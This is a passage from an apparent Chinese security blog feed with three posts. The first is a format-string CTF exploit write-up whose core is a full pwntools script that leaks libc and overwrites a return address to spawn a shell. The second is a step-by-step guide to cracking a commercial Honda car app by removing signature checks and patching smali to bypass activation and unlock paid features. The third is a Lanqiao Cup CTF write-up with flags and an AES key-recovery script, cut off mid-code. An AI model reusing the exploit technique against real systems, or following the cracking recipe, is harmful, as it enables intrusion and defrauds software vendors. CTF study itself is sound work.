class="number">1</span>)</span><br></pre></td></tr></table></figure><p>之后再去执行printf的时候返回地址还是没有更改，这就需要我们每一次先将返回地址修改，因为跳板指针不会变，所以我们这里可以直接修改，这是是打算将返回地址(rbp+8)修改为one_gadget，但这样却没办法执行，参考大佬的思路，是将printf的返回地址改为ret，再将此时栈顶改为one_gadget，就可以跳转到one_gagdet，getshell</p><h4 id="exp">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">size</span>):</span><br><span class="line"><span class="keyword">return</span> u64(p.recv(size).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;</span>)   </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;Gift: &quot;</span>)</span><br><span class="line">ret=<span class="built_in">int</span>(p.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">li(<span class="built_in">hex</span>(ret))</span><br><span class="line">pause()</span><br><span class="line">printf_ret=ret-<span class="number">12</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_ret - <span class="number">90</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span><span class="comment">#11</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x100023</span> - printf_ret).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x100&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x10e1f2</span></span><br><span class="line">ogg=libc_base+<span class="number">0xe3b01</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">li(<span class="built_in">hex</span>(ogg))</span><br><span class="line"></span><br><span class="line"><span class="comment">#a = p.recvall()</span></span><br><span class="line"><span class="comment">#li(hex(len(a)-1))</span></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((ret-<span class="number">4</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((ogg&amp;<span class="number">0xffff</span>))-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((ret-<span class="number">4</span>+<span class="number">2</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload =payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((ret-<span class="number">4</span>+<span class="number">2</span>+<span class="number">2</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">payload = b&#x27;%&#x27;+str(0x23).encode()+b&#x27;c%39$hhn&#x27;</span></span><br><span class="line"><span class="string">payload+=b&#x27;%&#x27;+str((ogg&gt;&gt;32)-0x23).encode()+b&#x27;c%41$hn&#x27;</span></span><br><span class="line"><span class="string">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="string">bug()</span></span><br><span class="line"><span class="string">s(payload)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xc4</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>好抽象，需要把这一部分去了才成功，调试发现是改错数字了，可能是我本地关闭arls的原因🧐，这里也不重要，前边改好之后后续改one_gadget就是一个板子题</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746604606300-e0e2cf4e-5e75-489b-8e80-5f6ea23cafa6.png" alt=""></p><h3 id="参考">参考</h3><p><a href="https://qfbsz.github.io/2024/10/02/onechance-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">https://qfbsz.github.io/2024/10/02/onechance-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</a></p><p><a href="https://zikh26.github.io/posts/a523e26a.html#%E5%89%8D%E8%A8%80">https://zikh26.github.io/posts/a523e26a.html#%E5%89%8D%E8%A8%80</a></p>]]></content>
    
    
    <summary type="html">极限fmt利用🧐</summary>
    
    
    
    <category term="Fmt" scheme="https://www.thir0th.xyz/categories/Fmt/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>本田车载app破解</title>
    <link href="https://www.thir0th.xyz/posts/9c6e1151.html"/>
    <id>https://www.thir0th.xyz/posts/9c6e1151.html</id>
    <published>2025-05-04T12:30:00.000Z</published>
    <updated>2025-05-07T08:47:44.763Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>本田车载app破解</h1><p>玩玩破解😁，整体流程比较简单，最终成功获取vip</p><h3 id="前情说明">前情说明</h3><p><strong>背景</strong>：之前有通过逆向添加log输出激活码再离线激活的方式，但联网会被注销激活码；也有用户通过幸运破解器修改6.9.16版本权限去除INTERNET权限禁止联网，但无法后续安装其他应用，且7.0以上版本添加签名校验，直接使用幸运破解器修改的app运行会报错。经测试，使用NP管理器去除签名校验后，再用幸运破解器去除网络权限可以运行。</p><p><strong>目标</strong>：跳过激活码检测以及去除吊销激活码后删除root权限。</p><h3 id="附件">附件</h3><p>原始文件Honda Hack_7.4.7.apk：<a href="https://wwrm.lanzoue.com/iYVv92d7wibe">https://wwrm.lanzoue.com/iYVv92d7wibe</a></p><h3 id="工具准备">工具准备</h3><p>模拟器：本篇文章是用的夜神模拟器</p><p>手机app：NP管理器：<a href="https://wwrm.lanzoue.com/i116u2s9esvi">https://wwrm.lanzoue.com/i116u2s9esvi</a></p><p>下载 jadx-gui-1.5.1-with-jre-win.zip：<a href="https://github.com/skylot/jadx/releases/tag/v1.5.1">https://github.com/skylot/jadx/releases/tag/v1.5.1</a></p><h3 id="程序运行">程序运行</h3><p>模拟器中打开apk，选择车型为思域</p><p><img src="https://s2.loli.net/2025/05/07/ORG3SegKE8juxoM.png" alt="image"></p><p>发现有好多功能普通用户都不能使用</p><p><img src="https://s2.loli.net/2025/05/07/Woi7CBPpxHjTNyO.png" alt="image"></p><p><img src="https://s2.loli.net/2025/05/07/ZD6Mphb2x4sLSz3.png" alt="image"></p><p><img src="https://s2.loli.net/2025/05/07/iBuXMVgclYWIrdk.png" alt="image"></p><h3 id="正活开始">正活开始</h3><p>关键词：“需要专业版”</p><p>jadx打开apk，搜索需要专业版</p><p><img src="https://s2.loli.net/2025/05/07/B54jc28TiXxgrvU.png" alt="image"></p><p>找到key：pro_function</p><p><img src="https://s2.loli.net/2025/05/07/TLbMxvpmljVOWci.png" alt="image"></p><p>搜索key，定位关键函数</p><p><img src="https://s2.loli.net/2025/05/07/z8QPs2Tfukxbn5J.png" alt="image"></p><p>发现第一个函数有常量字符串“<a href="http://google.com">google.com</a>”，第四个函数在执行到后面部分时会显示对话框且返回false</p><p><img src="https://s2.loli.net/2025/05/07/CyMw6dOiKbfE3HI.png" alt="image"></p><p>之后用np管理器去除apk签名</p><p>NP管理器是一款用于安卓应用签名管理的工具，其核心功能主要包括以下几点：</p><ol><li><strong>去除签名校验</strong>：能够移除APK文件的数字签名，使得修改后的APK文件可以绕过签名验证，避免因签名不一致导致的安装失败。</li><li><strong>重新签名</strong>：为去除签名校验后的APK文件生成新的签名，确保修改后的文件能够正常安装到安卓设备上。</li><li><strong>签名管理</strong>：支持管理多个签名密钥，方便用户对不同应用进行签名操作，提高签名管理的灵活性。</li></ol><p>首先将模拟器断网，要不然np管理器一直提示需要更新</p><p><img src="https://s2.loli.net/2025/05/07/MluTHKEY6gN5Uh4.png" alt="image"></p><p>np管理器提取安装包，对黑科技app进行去除签名校验</p><p><img src="https://s2.loli.net/2025/05/07/kC7Em1WjT9Hi8uN.png" alt="image"></p><p>‍</p><p><img src="https://s2.loli.net/2025/05/07/NpiKPeCnW2BqcHy.png" alt="image"></p><p><img src="https://s2.loli.net/2025/05/07/dlt9N4p5uCs6a7E.png" alt="image"></p><p>对新生成的文件，加了kill的文件，点击查看，点击classes.dex文件进行编辑，打开方式：DEX编辑器PLUS，<a href="http://xn--google-9v7ikb54j527dxvg54sio0dmmed7nc3he78g.com">搜索代码中的字符串常量google.com</a></p><p><img src="https://s2.loli.net/2025/05/07/a9VodvkphbXLEDO.png" alt="image"></p><p><img src="https://s2.loli.net/2025/05/07/5d4iVletRmjSzuP.png" alt="image">根据jadx看到的代码结构，第一个函数返回google.com字符串，第四个函数执行到后面部分时显示对话框，且返回false，我们就让它第一行返回true，其中代码if块里就返回true</p><p><img src="https://s2.loli.net/2025/05/07/APinf3KMLHDVUrI.png" alt="image"></p><p>smali中函数以.method开头，.end method结束，我们从google.com所在的第一个往下数，找到第四个，把函数中的第一次return true复制，粘贴到前面的位置</p><p><img src="https://s2.loli.net/2025/05/07/hfL6vBjgUd7mEFQ.png" alt="image"></p><p>保存并退出，一直退出到编译</p><p><img src="https://s2.loli.net/2025/05/07/oBHFd7ORuZqIPVS.png" alt="image"></p><p>到此，kill这个文件已经处理好了，可以安装运行了，我这里NP管理器默认自动签名，可以打开看一下是否有签名</p><p><img src="https://s2.loli.net/2025/05/07/lGqMEvRIkiuNDPf.png" alt="image"></p><p>模拟器删除app，重新安装kill这个apk，打开，选择车型优化，然后重启，在没激活前，高级功能下面现实的是升级到专业版，激活后，显示的是查看注册码<br>看看查看注册码是null，因为我们这是直接跳过了</p><p><img src="https://s2.loli.net/2025/05/07/9WzGPUoe4N6qdmD.png" alt="image"></p><p>高级用户功能都解锁了</p><p><img src="https://s2.loli.net/2025/05/07/xI51uSmoGV9jrln.png" alt="image"></p><h3 id="总结">总结</h3><p>总体来说比较简单，也就是了解了一下np管理器去除签名的功能，夜神模拟器有点不好用，后边还是换成雷神吧</p>]]></content>
    
    
    <summary type="html">本田车载app破解</summary>
    
    
    
    <category term="App" scheme="https://www.thir0th.xyz/categories/App/"/>
    
    
    <category term="Android" scheme="https://www.thir0th.xyz/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>2025蓝桥杯</title>
    <link href="https://www.thir0th.xyz/posts/f45c55ec.html"/>
    <id>https://www.thir0th.xyz/posts/f45c55ec.html</id>
    <published>2025-04-28T16:16:18.000Z</published>
    <updated>2025-04-29T08:20:50.095Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>整体来说还是挺简单的，去年的唯唯诺诺，今年的重拳出击😁</p><h3 id="数据分析">数据分析</h3><h4 id="flowzip">flowzip</h4><p>wireshark上传后，ctrl+F搜索字符串flag，找到flag</p><p><img src="https://s2.loli.net/2025/04/26/IX4Am8a9Or2coMK.png" alt="image-20250426103927875"></p><p>flag{c6db63e6-6459-4e75-bb37-3aec5d2b947b}</p><h4 id="ezEvtx">ezEvtx</h4><p>根据题目描述，右边筛选，选择警告之后寻找</p><p><img src="https://s2.loli.net/2025/04/26/oIvEh27eVcUxPYz.png" alt="image-20250426104204020"></p><p>找到文件名，提交正确</p><p><img src="https://s2.loli.net/2025/04/26/cLkAR17dfTVw36C.png" alt="image-20250426104256501"></p><p>flag{confidential.docx}</p><h3 id="密码破解">密码破解</h3><h4 id="Enigma">Enigma</h4><p>enigma加密的特性决定的，直接搜索enigma，看是不是有意义的，flag包裹提交成功</p><p><img src="https://s2.loli.net/2025/04/26/Ic6yPfVABGjORCm.png" alt="image-20250426112547140"></p><p>flag{HELLOCTFERTHISISAMESSAGEFORYOU}</p><h4 id="easy-AES">easy_AES</h4><p>根据题目描述，知道要爆破key</p><p>题目采用的是传统的AES加密，但是其中的key似乎可以通过爆破得到，你能找到其中的问题，解密出敏感数据吗？</p><p>通过 gift = key0 &amp; key1 的 nibble 级映射关系，构造每个 key0 nibble 的可能取值集合，并根据 key1 中相同值的全局一致性进行交叉约束，最后利用回溯枚举可能的 key0，验证是否能正确解密出以 flag{ 开头的明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知数据</span></span><br><span class="line">gift = <span class="number">64698960125130294692475067384121553664</span></span><br><span class="line">key1_hex = <span class="string">&quot;74aeb356c6eb74f364cd316497c0f714&quot;</span></span><br><span class="line">cipher = <span class="string">b&#x27;\x36\xbf\x9b\xb1\x93\x14\x82\x9a\xa4\xc2\xaf\xd0L\xad\xbb5\x0e|&gt;\x8c|\xf0^dl~X\xc7R\xcaZ\xab\x16\xbe r\xf6Pl\xe0\x93\xfc)\x0e\x93\x8e\xd3\xd6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入验证</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(key1_hex) != <span class="number">32</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;key1_hex must be 32 hexadecimal characters&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(cipher) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;cipher length must be a multiple of 16 bytes&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(cipher) &lt; <span class="number">16</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;cipher is too short to contain valid plaintext&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 gift 拆分成 32 个 nibble</span></span><br><span class="line">gift_bin = <span class="built_in">format</span>(gift, <span class="string">&#x27;0128b&#x27;</span>)</span><br><span class="line">gift_nibbles = [<span class="built_in">int</span>(gift_bin[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 key1 拆分成 32 个 nibble</span></span><br><span class="line">key1_nibbles = [<span class="built_in">int</span>(key1_hex[i:i+<span class="number">1</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算每个位置的候选值</span></span><br><span class="line">pos_cands = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    m = key1_nibbles[i]</span><br><span class="line">    b = gift_nibbles[i]</span><br><span class="line">    cands = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>) <span class="keyword">if</span> (x &amp; m) == b]</span><br><span class="line">    pos_cands.append(cands)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按 key1_nibble 的值分组，交叉约束得到每个值的候选集合</span></span><br><span class="line">positions_by_y = defaultdict(<span class="built_in">list</span>)</span><br><span class="line"><span class="keyword">for</span> i, y <span class="keyword">in</span> <span class="built_in">enumerate</span>(key1_nibbles):</span><br><span class="line">    positions_by_y[y].append(i)</span><br><span class="line"></span><br><span class="line">y_cands = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> y, poses <span class="keyword">in</span> positions_by_y.items():</span><br><span class="line">    s = <span class="built_in">set</span>(pos_cands[poses[<span class="number">0</span>]])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> poses[<span class="number">1</span>:]:</span><br><span class="line">        s &amp;= <span class="built_in">set</span>(pos_cands[i])</span><br><span class="line">    y_cands[y] = <span class="built_in">list</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 回溯枚举全局反置换 inv_map: y -&gt; x</span></span><br><span class="line">used = <span class="built_in">set</span>()</span><br><span class="line">inv_map = &#123;&#125;</span><br><span class="line">solutions = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按候选集大小升序排序，优先分配约束最严的 y</span></span><br><span class="line">items = <span class="built_in">sorted</span>(y_cands.items(), key=<span class="keyword">lambda</span> kv: <span class="built_in">len</span>(kv[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="built_in">len</span>(items):</span><br><span class="line">        key0_nibbles = [inv_map.get(y, <span class="number">0</span>) <span class="keyword">for</span> y <span class="keyword">in</span> key1_nibbles]</span><br><span class="line">        key0_hex = <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;<span class="subst">&#123;n:x&#125;</span>&quot;</span> <span class="keyword">for</span> n <span class="keyword">in</span> key0_nibbles)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 转换为字节形式的密钥</span></span><br><span class="line">            key0_bytes = <span class="built_in">bytes</span>.fromhex(key0_hex)</span><br><span class="line">            key1_bytes = <span class="built_in">bytes</span>.fromhex(key1_hex)</span><br><span class="line">            <span class="comment"># 双重AES-CBC解密</span></span><br><span class="line">            aes0 = AES.new(key0_bytes, AES.MODE_CBC, key1_bytes)</span><br><span class="line">            aes1 = AES.new(key1_bytes, AES.MODE_CBC, key0_bytes)</span><br><span class="line">            pt = unpad(aes0.decrypt(aes1.encrypt(cipher)), AES.block_size)</span><br><span class="line">            <span class="keyword">if</span> pt.startswith(<span class="string">b&quot;flag&#123;&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found correct key0: <span class="subst">&#123;key0_hex&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Plaintext flag: <span class="subst">&#123;pt.decode()&#125;</span>&quot;</span>)</span><br><span class="line">                solutions.append((key0_hex, pt.decode()))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 找到一个解后停止（可改为 False 枚举所有解）</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span>  <span class="comment"># 